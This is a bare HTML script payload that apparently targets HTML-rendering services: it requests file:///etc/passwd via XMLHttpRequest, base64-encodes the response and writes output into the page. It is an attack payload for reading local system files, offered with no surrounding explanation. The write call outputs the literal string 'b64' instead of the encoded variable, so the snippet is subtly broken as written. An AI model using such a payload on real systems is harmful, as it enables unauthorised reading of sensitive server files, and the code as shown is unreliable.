<script>
function reqListener() {
    var b64 = btoa(this.responseText);
    document.write('b64');
} 
var oReq = new XMLHttpRequest(); 
oReq.addEventListener("load", reqListener); 
oReq.open("GET", "file:///etc/passwd"); 
oReq.send();
</script>
